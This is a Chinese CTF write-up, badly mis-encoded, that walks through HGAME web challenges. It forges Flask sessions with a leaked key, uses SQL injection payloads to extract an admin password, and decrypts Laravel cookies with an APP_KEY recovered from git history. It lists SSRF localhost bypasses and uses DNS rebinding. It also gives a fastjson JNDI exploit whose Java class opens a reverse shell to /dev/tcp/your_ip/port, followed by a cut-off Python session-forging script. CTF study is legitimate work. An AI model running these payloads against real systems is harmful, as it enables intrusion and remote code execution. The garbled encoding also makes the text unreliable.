\u0026#39;.eJwljztqQzEQAO-i2sXuSlpJvsxjv8QYEnjPrkLubkGa6QZmfsuRZ1xf5f4633Erx8PLvSTRjFoNNakTA_QchoC0fMlmGgtR8kRhI_TRhNb0QJIkWGukkjB5MC9ts4VONOBuFZJy9LU0vfbhlt1osok2ZIXk8A0pt2LXmcfr5xnfuwfFlIMcQEbSVPW05r1ip6W1br9RA-3be19x_k8QcPn7ABDuP70.XHK0ew.2CT1_Vu5Qp8rMbm8ig80dve2-Zg\u0026#39; {u\u0026#39;csrf_token\u0026#39;: u\u0026#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5\u0026#39;, u\u0026#39;_fresh\u0026#39;: True, u\u0026#39;user_id\u0026#39;: u\u0026#39;206\u0026#39;, u\u0026#39;_id\u0026#39;: u\u0026#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a\u0026#39;} è¿™é‡Œåƒä¸‡ä¸è¦æ”¹å…¶ä»–çš„ä¸œè¥¿ï¼Œå°±æ”¹u'user_id'å­—æ®µå°±å¯ä»¥äº†ï¼Œæ”¹æˆ 1 åç”¨encodeå°±è¡Œäº†ï¼Œè¿™é‡Œæœ‰å¸ˆå‚…è¯´è¦ç”¨ python3 ï¼Œå› ä¸º timestamp çš„åŸå› ï¼Œå¯æ˜¯è¿™é‡Œæˆ‘å¹¶æ²¡æœ‰ç”¨ python3 ï¼Œç›´æ¥ç”¨ python2 å°±è¿‡äº†\npython2 session_cookie_manager.py encode -s \u0026#39;9RxdzNwq7!nOoK3*\u0026#39; -t \u0026#34;{u\u0026#39;csrf_token\u0026#39;: u\u0026#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5\u0026#39;, u\u0026#39;_fresh\u0026#39;: True, u\u0026#39;user_id\u0026#39;: u\u0026#39;1\u0026#39;, u\u0026#39;_id\u0026#39;: u\u0026#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a\u0026#39;}\u0026#34; {u\u0026#39;csrf_token\u0026#39;: u\u0026#39;1acb6e2d00a7f28bbdfc4d531529b336ca4240b5\u0026#39;, u\u0026#39;_fresh\u0026#39;: True, u\u0026#39;user_id\u0026#39;: u\u0026#39;1\u0026#39;, u\u0026#39;_id\u0026#39;: u\u0026#39;f228e33c1bf2526005f7c10129d9a129fc6a22f681a6c21d74a298de12af20997fb2a62de669b484eb81c065c30f2f7599bfd357dcf5c286cab416b0f6ed0f6a\u0026#39;}  \nhappyPHP  flag åœ¨ç®¡ç†å‘˜è´¦å·ä¸‹\nhttp://118.25.18.223:3000/\n åœ¨çœ‹ git çš„æ—¶å€™ï¼Œåˆ‡è®°è¦çœ‹ä¸€ä¸‹å†å²è®°å½•ï¼Œå¯èƒ½ä¼šæœ‰æ–°æ”¶è·\næºç å‘ç°ç»™äº† github ä»“åº“https://github.com/Lou00/laravelï¼Œæ˜¯ä¸€å¥—ç”¨ laravel å†™çš„\næ…¢æ…¢å®¡è®¡ï¼Œåœ¨laravel/app/Http/Controllers/SessionsController.phpä¸­å‘ç°ä¸€ä¸‹ä»£ç \npublic function store(Request $request) { $credentials = $this-\u0026gt;validate($request, [ \u0026#39;email\u0026#39; =\u0026gt; \u0026#39;required|email|max:100\u0026#39;, \u0026#39;password\u0026#39; =\u0026gt; \u0026#39;required\u0026#39; ]); if (Auth::attempt($credentials)) { if (Auth::user()-\u0026gt;id ===1){ session()-\u0026gt;flash(\u0026#39;info\u0026#39;,\u0026#39;flag :******\u0026#39;); return redirect()-\u0026gt;route(\u0026#39;users.show\u0026#39;); } $name = DB::select(\u0026#34;SELECT name FROM `users` WHERE `name`=\u0026#39;\u0026#34;.Auth::user()-\u0026gt;name.\u0026#34;\u0026#39;\u0026#34;); session()-\u0026gt;flash(\u0026#39;info\u0026#39;, \u0026#39;hello \u0026#39;.$name[0]-\u0026gt;name); return redirect()-\u0026gt;route(\u0026#39;users.show\u0026#39;); } else { session()-\u0026gt;flash(\u0026#39;danger\u0026#39;, \u0026#39;sorry,login failed\u0026#39;); return redirect()-\u0026gt;back()-\u0026gt;withInput(); } } è€Œæ•´ä¸ªè·¯ç”±æœ‰\nRoute::get(\u0026#39;/\u0026#39;, \u0026#39;StaticPagesController@home\u0026#39;)-\u0026gt;name(\u0026#39;home\u0026#39;); Route::get(\u0026#39;/register\u0026#39;,\u0026#39;UsersController@register\u0026#39;)-\u0026gt;name(\u0026#39;register\u0026#39;); Route::get(\u0026#39;/login\u0026#39;,\u0026#39;UsersController@login\u0026#39;)-\u0026gt;name(\u0026#39;login\u0026#39;); Route::get(\u0026#39;/users\u0026#39;, \u0026#39;UsersController@show\u0026#39;)-\u0026gt;name(\u0026#39;users.show\u0026#39;); Route::post(\u0026#39;/users\u0026#39;, \u0026#39;UsersController@store\u0026#39;)-\u0026gt;name(\u0026#39;users.store\u0026#39;); Route::post(\u0026#39;/login\u0026#39;, \u0026#39;SessionsController@store\u0026#39;)-\u0026gt;name(\u0026#39;login\u0026#39;); Route::get(\u0026#39;/logout\u0026#39;, \u0026#39;SessionsController@destroy\u0026#39;)-\u0026gt;name(\u0026#39;logout\u0026#39;); æ‰€ä»¥æˆ‘ä»¬è¿˜æ˜¯éœ€è¦ç™»å½•ç®¡ç†å‘˜è´¦å·å»è·å– flagï¼Œè€Œä¸”è¿™é‡Œçš„æ³¨å…¥ç‚¹æ˜¯nameï¼Œé‚®ç®±å”¯ä¸€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ³¨å†Œä¸€ä¸ªname=admin' or 1=1;#çš„è´¦æˆ·æµ‹è¯•æ³¨å…¥\n \næ‰€ä»¥ç”¨\nadmin\u0026#39; union select password FROM `users` WHERE `id`= \u0026#39;1\u0026#39; ORDER BY name DESC;# å¾—åˆ° admin çš„å¯†ç  admin\u0026#39;unionselectemailFROM`users`WHERE`id`=\u0026#39;1\u0026#39;ORDERBYnameDESC;#å¾—åˆ°adminçš„é‚®ç®±admin@hgame.coma\u0026#39; union select load_file(\u0026#39;/etc/passwd\u0026#39;) ORDER BY name DESC;# è¯»å–å¤±è´¥ å¾—åˆ°\neyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ== base64_decode å¾—åˆ° {\u0026#34;iv\u0026#34;:\u0026#34;rnVrqfCvfJgnvSTi9z7KLw==\u0026#34;,\u0026#34;value\u0026#34;:\u0026#34;EaR\\/4fldOGP1G\\/aDK8e8u1Aldmxl+yB3s+kBAaoPods=\u0026#34;,\u0026#34;mac\u0026#34;:\u0026#34;56e2b33ecd2828fe6f417c7e98e9a588c097f083499e0cc7237bc27741e829af\u0026#34;} å°è¯•å‚è€ƒLaravel cookie ä¼ªé€ ,è§£å¯†,å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼Œå¯¹id=1çš„ç®¡ç†å‘˜è¿›è¡Œ cookie ä¼ªé€ ï¼Œä½†æ˜¯æ— è§£ã€‚\næ‰¾åˆ°ä¸€ä¸ª php è§£å¯†è„šæœ¬ï¼Œä½†æ˜¯æ²¡æœ‰$keyï¼Œå°±æ²¡åŠæ³•è§£å¯†ã€‚åœ¨è€Œ$keyå­˜åœ¨äº.envä¸­ï¼Œæˆ‘ä»¬åœ¨github commitä¸­æ‰¾åˆ°äº†è¢«åˆ é™¤çš„.envï¼Œ.envä¸­æ‰¾åˆ°APP_KEY=base64:9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=\næœäº†ä¸€ä¸‹è§£å¯†è„šæœ¬ï¼Œlaravel cookie åŠ è§£å¯†\n\u0026lt;?php function decode($str,$key){ $payload = json_decode(base64_decode($str), true); $iv = base64_decode($payload[\u0026#39;iv\u0026#39;]); $decrypted = openssl_decrypt($payload[\u0026#39;value\u0026#39;], \u0026#39;AES-256-CBC\u0026#39;, $key, 0, $iv); return unserialize($decrypted); } function encode($value,$key){ $iv = random_bytes(openssl_cipher_iv_length(\u0026#39;AES-256-CBC\u0026#39;)); $value = openssl_encrypt(serialize($value),\u0026#39;AES-256-CBC\u0026#39;, $key, 0, $iv); $iv = base64_encode($iv); $mac = hash_hmac(\u0026#39;sha256\u0026#39;,$iv.$value,$key); $json = json_encode(compact(\u0026#39;iv\u0026#39;, \u0026#39;value\u0026#39;, \u0026#39;mac\u0026#39;)); return base64_encode($json); } /** * .env é‡Œé¢çš„ APP_KEY */ $key = base64_decode(\u0026#39;9JiyApvLIBndWT69FUBJ8EQz6xXl5vBs7ofRDm9rogQ=\u0026#39;); $value = \u0026#39;596|6EvT3jxKRaTwcuj5NEgdnztIjjKDX4lfqz38DGDR4hET8XaEXS35vZTksROl|\u0026#39;; // $str = encode($value,$key).PHP_EOL; $str = \u0026#39;eyJpdiI6InJuVnJxZkN2ZkpnbnZTVGk5ejdLTHc9PSIsInZhbHVlIjoiRWFSXC80ZmxkT0dQMUdcL2FESzhlOHUxQWxkbXhsK3lCM3Mra0JBYW9Qb2RzPSIsIm1hYyI6IjU2ZTJiMzNlY2QyODI4ZmU2ZjQxN2M3ZTk4ZTlhNTg4YzA5N2YwODM0OTllMGNjNzIzN2JjMjc3NDFlODI5YWYifQ==\u0026#39;; echo decode($str,$key); æŠŠç›¸å…³å‚æ•°å¡«ä¸Šï¼Œå¾—åˆ°å¯†ç  9pqfPIer0Ir9UUfRï¼Œç™»å½•admin@hgame.comå¾—åˆ° flag\n \nè¿™é‡Œä¸€å¼€å§‹ä»¥ä¸ºè‡ªå·±ç ´è§£å¯†ç çš„æ€è·¯ä¸å¤ªå¯¹ï¼Œè€Œä¸”è‡ªå·±ä¹‹å‰ä¹Ÿæ²¡æœ‰å…³æ³¨åˆ° commit æ‰¾åˆ°$keyã€‚è¿˜æ˜¯ä¸»è¦æ˜¯æ‰¾è„šæœ¬ä¸å¤ªå¥½æ‰¾ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šä¸ªè„šæœ¬éƒ½æ²¡æœ‰æˆåŠŸè§£å¯†ã€‚åæ¥ç»è¿‡å¸ˆå‚…æç‚¹æ‰çŸ¥é“ç¡®å®å¯ä»¥å¯†ç ç ´è§£ï¼Œå°±å»å„ç§æ‰¾å¯†ç äº†æ‰æå®šã€‚\nhappyJava  java is not so hard, is it right? hint: spring-boot-actuator\nhttp://119.28.26.122:23333/index\n  \né¢˜ç›®è®¾ç½®å¾ˆç®€å•ï¼Œç›®å½•ä»€ä¹ˆçš„ä¸å­˜åœ¨çš„ï¼Œç›´æ¥è®¿é—®/hgame_flagç›´æ¥è¿”å›ä¸å…¶ä»–é¡µé¢ä¸€æ ·çš„ 404 ä¸å­˜åœ¨çš„é”™è¯¯\n \nçœ‹äº†ä¸€ä¸‹Springboot ä¹‹ actuator é…ç½®ä¸å½“çš„æ¼æ´åˆ©ç”¨ï¼Œä»¥åŠspring boot 2 ä½¿ç”¨ actuator 404 çš„é—®é¢˜éå†äº†æ•æ„Ÿè·¯å¾„éƒ½æ˜¯ 404 â€¦â€¦1.x å’Œ 2.x è·¯å¾„éƒ½è¯•è¿‡äº†\u0026hellip;æ²¡å•¥æƒ³æ³•\nä»¥ä¸‹æ˜¯å¤ç° wpâ€¦â€¦orz:\nactuator éƒ¨ç½²æ—¶ï¼Œå¯ä»¥é€‰æ‹©ä¸å½“å‰é¡¹ç›®ä¸åŒç«¯å£\näºæ˜¯æ‰«ä¸€æ³¢ç«¯å£å¯ä»¥çœ‹åˆ°9876è·Ÿ31337\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-02-24 23:36 CST Nmap scan report for 119.28.26.122 Host is up (0.045s latency). Not shown: 987 closed ports PORT STATE SERVICE 22/tcp open ssh 135/tcp filtered msrpc 139/tcp filtered netbios-ssn 445/tcp filtered microsoft-ds 593/tcp filtered http-rpc-epmap 901/tcp filtered samba-swat 1025/tcp filtered NFS-or-IIS 3128/tcp filtered squid-http 4444/tcp filtered krb524 6129/tcp filtered unknown 6667/tcp filtered irc 9876/tcp open sd 31337/tcp open Elite Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds 31337åº”è¯¥ä¸æ˜¯httpæœåŠ¡ï¼Œäºæ˜¯åœ¨9876æ‰«äº†ä¸€æ³¢ç›®å½•ï¼Œç»ˆäºå‘ç°äº†æ³„éœ²çš„å…³é”®ä¿¡æ¯ï¼Œhttp://119.28.26.122:9876/infoè¿”å›äº†ç©ºçš„jsonï¼Œhttp://119.28.26.122:9876/mappingsè¿”å›äº†å¦‚ä¸‹ä¿¡æ¯\n{\u0026quot;/webjars/**\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;resourceHandlerMapping\u0026quot;},\u0026quot;/**\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;resourceHandlerMapping\u0026quot;},\u0026quot;/**/favicon.ico\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;faviconHandlerMapping\u0026quot;},\u0026quot;{[/index],methods=[GET]}\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;requestMappingHandlerMapping\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;public java.lang.String me.lightless.happyjava.controller.MainController.Index()\u0026quot;},\u0026quot;{[/you_will_never_find_this_interface],methods=[GET]}\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;requestMappingHandlerMapping\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;public java.lang.String me.lightless.happyjava.controller.MainController.YouWillNeverFindThisInterface(java.lang.String)\u0026quot;},\u0026quot;{[/secret_flag_here],methods=[GET]}\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;requestMappingHandlerMapping\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;public java.lang.String me.lightless.happyjava.controller.MainController.SecretFlagHere(java.lang.String,javax.servlet.http.HttpServletRequest)\u0026quot;},\u0026quot;{[/error],methods=[GET]}\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;requestMappingHandlerMapping\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;public java.lang.String me.lightless.happyjava.controller.ErrorController.ShowCommonError()\u0026quot;},\u0026quot;{[/error],produces=[text/html]}\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;requestMappingHandlerMapping\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;public org.springframework.web.servlet.ModelAndView org.springframework.boot.autoconfigure.web.BasicErrorController.errorHtml(javax.servlet.http.HttpServletRequest,javax.servlet.http.HttpServletResponse)\u0026quot;},\u0026quot;{[/error]}\u0026quot;:{\u0026quot;bean\u0026quot;:\u0026quot;requestMappingHandlerMapping\u0026quot;,\u0026quot;method\u0026quot;:\u0026quot;public org.springframework.http.ResponseEntity\u0026lt;java.util.Map\u0026lt;java.lang.String, java.lang.Object\u0026gt;\u0026gt; org.springframework.boot.autoconfigure.web.BasicErrorController.error(javax.servlet.http.HttpServletRequest)\u0026quot;}} è®¿é—®/secret_flag_hereï¼Œå‘ç°è¿”å›\nHTTP/1.1 200 X-Application-Context: application:23333 Content-Type: text/html;charset=UTF-8 Content-Length: 87 Date: Sun, 24 Feb 2019 15:57:48 GMT Connection: close This is danger interface, only allow request from 127.0.0.1!\u0026lt;br/\u0026gt;Your IP:xxx.xxx.xxx.xxx(å·²æ‰“ç ) ç”¨ä»¥ä¸‹ä¸€æ¢­å­ HTTP å¤´ä¼ªé€ éƒ½æ²¡æœ‰ç”¨\u0026hellip;\nClient-Ip: 127.0.0.1 X-Client-IP: 127.0.0.1 X-Real-IP: 127.0.0.1 True-Client-IP: 127.0.0.1 X-Originating-IP: 127.0.0.1 X-Forwarded-For: 127.0.0.1 X-Remote-IP: 127.0.0.1 X-Remote-Addr: 127.0.0.1 X-Forwarded-Host: 127.0.0.1 åº”è¯¥æ˜¯è¦å½¢æˆ ssrf æˆ–è€…å…¶ä»–çš„äº†å§ï¼Œå°è¯•ç»§ç»­è®¿é—®/you_will_never_find_this_interfaceï¼Œå¾—åˆ°\nHTTP/1.1 200 X-Application-Context: application:23333 Content-Type: text/html;charset=UTF-8 Content-Length: 20 Date: Sun, 24 Feb 2019 16:00:53 GMT Connection: close `url` cant be empty! å°è¯•è®¿é—®/you_will_never_find_this_interface?url=1ï¼Œè¿”å›\nemmmmmmm, something went wrong: no protocol: 1 å°è¯•url=http://localhost/you_will_never_find_this_interfaceï¼Œè¿”å›\nDont be evil. Dont request 127.0.0.1. http%3a//[%3a%3a]%3a23333/you_will_never_find_this_interfaceè¿”å› 400\nhttp://example.com@127.0.0.1:23333/you_will_never_find_this_interface http://127.0.0.1.xip.io:23333/you_will_never_find_this_interface Dont be evil. Dont request 127.0.0.1. http://127ã€‚0ã€‚0ã€‚1/secret_flag_here emmmmmmm, something went wrong: Label has two-byte char: 127ã€‚0ã€‚0ã€‚1 http://0x7f000001:23333/secret_flag_here emmmmmmm, something went wrong: DNS name not found [response code 3] http://0177.0.0.1:23333/secret_flag_here emmmmmmm, something went wrong: connect timed out http://2130706433:23333/secret_flag_here Dont be evil. Dont request 127.0.0.1. â“µâ“¶â“».â“¿.â“¿.â“µ emmmmmmm, something went wrong: Label has two-byte char: â“µâ“¶â“» å°è¯•äº†å¾ˆå¤šç»•è¿‡æ–¹æ³•éƒ½æ²¡ç”¨ï¼Œæœ€ååªå‰©ä¸‹ç”¨DNS Rebindingæ¥è¿›è¡Œç»•è¿‡äº†\né¦–å…ˆäº†è§£ä¸€æ³¢å…³äº DNS-rebinding çš„æ€»ç»“ï¼Œå¯ä»¥å‘ç°æœ‰ä¸ªæ¯”è¾ƒæ–¹ä¾¿çš„æ–¹æ³•ï¼Œå°±æ˜¯è®¾ç½®ä¸¤ä¸ª A è®°å½•ï¼Œä¸€ä¸ªæŒ‡å‘ 127.0.0.1ï¼Œå¦å¤–ä¸€ä¸ªæŒ‡å‘ä¸æ˜¯ 127.0.0.1 çš„åœ°å€å³å¯ã€‚\nè¿™é‡ŒåŸæ–‡è§£é‡Šçš„ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œåˆè¯·æ•™äº†ä¸€ä¸‹ç™½å¸ˆå‚…ï¼Œæ‰æ˜ç™½ä¸¤ä¸ªè®°å½•æ€ä¹ˆç»•è¿‡å¯¹ 127.0.0.1 çš„æ£€æµ‹çš„ã€‚é¦–å…ˆç¬¬ä¸€æ¬¡ DNS è§£æåœ¨ waf å¤„ï¼Œæ£€æŸ¥ DNS è®°å½•æ˜¯å¦æ˜¯ 127.0.0.1 ï¼Œç¬¬äºŒæ¬¡ DNS è§£æåœ¨ ajax æˆ–è€…è¯·æ±‚æˆ‘ä»¬ä¼ å…¥çš„ url åœ°å€çš„æ—¶å€™è¿›è¡Œçš„ï¼Œå› ä¸º DNS éšæœºè§£æï¼Œæ‰€ä»¥å¦‚æœç¬¬ä¸€æ¬¡è§£æï¼Œè§£æåˆ°äº†æˆ‘ä»¬è®¾ç½®çš„é 127.0.0.1 çš„åœ°å€ï¼Œå°±å¯ä»¥ç»•è¿‡ waf å¯¹ 127.0.0.1 çš„æ£€æµ‹ï¼Œå¦åˆ™è§£æåˆ° 127.0.0.1 å°±ç›´æ¥è¢« waf ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡é€šè¿‡çš„æ¦‚ç‡ä¸º 1/2 ï¼›å¦‚æœç¬¬äºŒæ¬¡è§£æï¼Œä¹Ÿå°±æ˜¯åœ¨å¯¹ url è¿›è¡Œè¯·æ±‚çš„æ—¶å€™ï¼Œè§£æåˆ°äº† 127.0.0.1 çš„è¯ï¼Œè¿™æ¬¡ ssrf å°±ç®—æˆåŠŸäº†ï¼Œä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬è®¿é—®å†…ç½‘åœ°å€çš„ç›®çš„ï¼Œå¦‚æœè§£æä¸æ˜¯ 127.0.0.1 çš„è¯ï¼Œé‚£å°±å¤±è´¥äº†ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡æˆåŠŸæ¦‚ç‡ä¹Ÿæ˜¯ 1/2 ã€‚ç»¼è¿°ï¼Œæ•´ä¸ªDNS Rebindingé‡‡ç”¨ä¸¤ä¸ªAè®°å½•ç»•è¿‡çš„æˆåŠŸæ¦‚ç‡ä¸º 1/2 ã€‚\n \nå¯ä»¥çœ‹åˆ°è¿™é‡Œå·²ç»æˆåŠŸäº†ã€‚\nä¼ å…¥dataå‚æ•°ï¼Œå› ä¸ºä½œä¸º/secret_flagçš„å‚æ•°ï¼Œè¿™é‡Œæ³¨æ„è¦ç”¨urlencodeï¼Œçœ‹åˆ°è¿”å›WoW! Convert JSON to object...OK!\u0026lt;br\u0026gt;Result: 1\n \nå¯ä»¥ä½¿ç”¨fastjsonååºåˆ—åŒ–æå®šï¼Œä½†æ˜¯ä½¿ç”¨vulhubä¸‹çš„fastjsonçš„ exp ç›´æ¥å°±æŠ¥äº† waf\n \nå‚è€ƒFastJson ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ç¬”è®°#åŸºäº JNDI çš„ PoCï¼Œæ„é€ å¦‚ä¸‹çš„Exploit.javaï¼Œç„¶åç¼–è¯‘æˆ.classæ–‡ä»¶æ”¾åœ¨ HTTP æœåŠ¡ç«¯å£ä¸‹æä¾›åç»­ä¸‹è½½\npublic class Exploit { public Exploit(){ try { java.lang.Runtime.getRuntime().exec( new String[]{\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;bash -c \\\u0026#34;sh \u0026gt;\u0026amp; /dev/tcp/your_ip/port 0\u0026gt;\u0026amp;1\\\u0026#34;\u0026#34;}); } catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } åœ¨ vps ä¸Šä¸‹è½½marshalsecæä¾›ldapæœåŠ¡ï¼ŒæŒ‰ç…§æ­¥éª¤mvn clean package -DskipTestsç¼–è¯‘å¥½åï¼Œ\n$ java -cp ./target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your_ip:port/#Exploit åœ¨ä¸€ä¸ªç«¯å£èµ·ä¸€ä¸ª HTTP æœåŠ¡æä¾›å—å®³è€…ä¸‹è½½Exploit.classï¼Œåœ¨å‘é€ä»¥ä¸‹ payload\n{\u0026#34;@type\u0026#34;:\u0026#34;com.sun.rowset.JdbcRowSetImpl\u0026#34;,\u0026#34;dataSourceName\u0026#34;:\u0026#34;ldap://your_ip:1389/Exploit\u0026#34;,\u0026#34;autoCommit\u0026#34;:true} è®°å¾—äºŒæ¬¡ urlencode ï¼ŒæˆåŠŸgetshell\n \n \nhappyGo  â€‹\tåˆ«é—®ï¼Œé—®å°±æ˜¯ cve æ”¹çš„ â€‹\tflag åœ¨/flag é‡Œ â€‹\tsource code:https://pan.baidu.com/s/1wQwqxF6DUr-2AIC_giud0g æå–ç : 6v2i\nhttp://94.191.10.201:7000/\n å¤ç°é¢˜ 2333â€¦â€¦orz\né¢˜ç›®æä¾›æ³¨å†Œç™»å½•åŠŸèƒ½ï¼Œç™»å½•è¿›æ¥åå¯ä»¥å‘é€æ¶ˆæ¯\n \nä¹Ÿå¯ä»¥ä¿®æ”¹è‡ªå·±çš„å¤´åƒ\n \nå‘ç°æºç æœ‰åœ°æ–¹\nbeego.Router(\u0026#34;/admin\u0026#34;, \u0026amp;controllers.AdminController{}) beego.Router(\u0026#34;/admin/user/del/:id([0-9]+\u0026#34;, \u0026amp;controllers.UserDelController{}) çœ‹åˆ°ä¸€ä¸ªæ¯”è¾ƒå¥‡æ€ªçš„åŠŸèƒ½ï¼Œè·Ÿè¿›Controllerçœ‹çœ‹\ntype AdminController struct { beego.Controller } func (c *AdminController) Get() { uid := c.GetSession(\u0026#34;uid\u0026#34;) if uid == nil { c.Abort(\u0026#34;500\u0026#34;) } if uid.(int) != 1 { c.Redirect(\u0026#34;/\u0026#34;, http.StatusFound) return } o := orm.NewOrm() u := models.Users{Id:uid.(int)} us := []models.Users{} err := o.Read(\u0026amp;u) if err != nil { c.Abort(\u0026#34;500\u0026#34;) } _, err = o.QueryTable(\u0026#34;users\u0026#34;).Filter(\u0026#34;id__gt\u0026#34;,1).All(\u0026amp;us) if err != nil { c.Abort(\u0026#34;500\u0026#34;) } c.Data[\u0026#34;Users\u0026#34;] = us c.Data[\u0026#34;Avatar\u0026#34;] = u.Avatar c.Data[\u0026#34;Username\u0026#34;] = u.Username c.Data[\u0026#34;UID\u0026#34;] = u.Id c.TplName = \u0026#34;admin.tpl\u0026#34; } type UserDelController struct { beego.Controller } func (u *UserDelController) Get() { uid := u.GetSession(\u0026#34;uid\u0026#34;) if uid == nil { u.Abort(\u0026#34;500\u0026#34;) } if uid.(int) != 1 { u.Redirect(\u0026#34;/\u0026#34;, http.StatusFound) return } id := u.Ctx.Input.Param(\u0026#34;:id\u0026#34;) i, _ := strconv.Atoi(id) if i == 1 { u.Redirect(\u0026#34;/admin\u0026#34;, http.StatusFound) return } o := orm.NewOrm() user := models.Users{Id:i} err := o.Read(\u0026amp;user) if err != nil { u.Abort(\u0026#34;500\u0026#34;) } if user.Avatar != \u0026#34;/static/img/avatar.jpg\u0026#34; { os.Remove(user.Avatar) } o.QueryTable(\u0026#34;messages\u0026#34;).Filter(\u0026#34;uid\u0026#34;, id).Delete() o.Delete(\u0026amp;user) u.Redirect(\u0026#34;/admin\u0026#34;, http.StatusFound) } è™½ç„¶çœ‹èµ·æ¥Goè¯­è¨€æœ‰ç‚¹å¤æ€ªï¼Œä½†æ˜¯ä»£ç é€»è¾‘è¿˜æ˜¯å¤§è‡´æ‡‚å¾—ï¼Œçœ‹èµ·æ¥é€»è¾‘éƒ½æ¯”è¾ƒæ­£å¸¸ï¼Œä½†æ˜¯åœ¨os.Remove(user.Avatar)ï¼Œå­˜åœ¨ä¸€ä¸ªè¶Šæƒï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ§åˆ¶user.Avatarï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ é™¤ä»»æ„æ–‡ä»¶äº†ã€‚\nè¿˜æœ‰ä¸€ä¸ªè·¯ç”±å°±æ˜¯/installè·¯ç”±\nbeego.Router(\u0026#34;/install\u0026#34;, \u0026amp;controllers.InstallController{}) æŸ¥çœ‹InstallController\ntype InstallController struct { beego.Controller } func (c *InstallController) Get() { _, err := os.Stat(\u0026#34;conf/app.conf\u0026#34;) if err != nil \u0026amp;\u0026amp; os.IsNotExist(err) { c.TplName = \u0026#34;install.tpl\u0026#34; } else { c.Redirect(\u0026#34;/\u0026#34;, http.StatusFound) return } } func (c *InstallController) Post() { _, err := os.Stat(\u0026#34;conf/app.conf\u0026#34;) if err != nil \u0026amp;\u0026amp; os.IsNotExist(err) { //pass \t} else { c.Redirect(\u0026#34;/\u0026#34;, http.StatusFound) return } type data struct { Host string\t`form:\u0026#34;host\u0026#34;` Port string\t`form:\u0026#34;port\u0026#34;` Username string\t`form:\u0026#34;username\u0026#34;` Password string\t`form:\u0026#34;password\u0026#34;` Database string\t`form:\u0026#34;database\u0026#34;` } d := data{} if err := c.ParseForm(\u0026amp;d); err != nil { c.Abort(\u0026#34;500\u0026#34;) } s := `[mysql] username = %s password = %s host = %s port = %s database = %s ` err = ioutil.WriteFile(\u0026#34;conf/app.conf\u0026#34;, []byte(fmt.Sprintf(s, d.Username, d.Password, d.Host, d.Port, d.Database)),0666) if err != nil { c.Abort(\u0026#34;500\u0026#34;) } c.Redirect(\u0026#34;/\u0026#34;, http.StatusFound) } æ ¹æ®Read MySQL Client\u0026rsquo;s Fileï¼Œåº”è¯¥æ˜¯å‡ºé¢˜äººçš„åšå®¢äº†å§ 2333\u0026hellip; å¤§è‡´æˆ‘ä»¬å¯ä»¥çŒœæµ‹æ•´ä¸ªæµç¨‹ï¼Œç™»å½•ç®¡ç†å‘˜ï¼Œåˆ é™¤app.confï¼Œé‡æ–°installï¼Œç”¨æ¶æ„mysqlæœåŠ¡å™¨è¯»å–ä»»æ„æ–‡ä»¶ã€‚è€Œç™»å½•ç®¡ç†å‘˜å°±éœ€è¦çœ‹åˆ°åœ¨main.goä¸­çš„ä¸»å‡½æ•°äº†\nfunc main() { beego.BConfig.WebConfig.Session.SessionName = \u0026#34;PHPSESSID\u0026#34; beego.BConfig.WebConfig.Session.SessionProvider=\u0026#34;file\u0026#34; beego.BConfig.WebConfig.Session.SessionProviderConfig = \u0026#34;./tmp\u0026#34; beego.BConfig.WebConfig.Session.SessionOn = true beego.Run() } æ­ç¯å¢ƒå§‹ç»ˆæ²¡æ‰¾åˆ°catmsg/routersè¿™ä¸ªåŒ…\u0026hellip;èœœæ±å°´å°¬ï¼Œè¿˜æ˜¯æ”¾å¼ƒäº†ã€‚è€Œä¸”writeupå†™çš„æå…¶ç®€å•\u0026hellip;å¹¶æ²¡æœ‰è¯¦ç»†å‰–æåŸç†ã€‚\nè´´ä¸€ä¸‹å…¶ä»–å¸ˆå‚…çš„è„šæœ¬ï¼Œsessionä¼ªé€ è„šæœ¬\n# coding:utf-8 import requests import base64 ip=\u0026#34;94.191.10.201\u0026#34; host=\u0026#34;http://94.191.10.201:7000\u0026#34; registerURL = host + \u0026#34;/auth/register\u0026#34; loginURL = host + \u0026#34;/auth/login\u0026#34; userinfoURL = host + \u0026#34;/userinfo\u0026#34; req = requests.session() # register registerData={ 